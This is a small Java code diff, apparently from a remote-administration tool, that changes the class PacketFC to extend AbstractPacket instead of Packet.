@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FramePreviewFile;
 
-public class PacketFC extends Packet {
+public class PacketFC extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
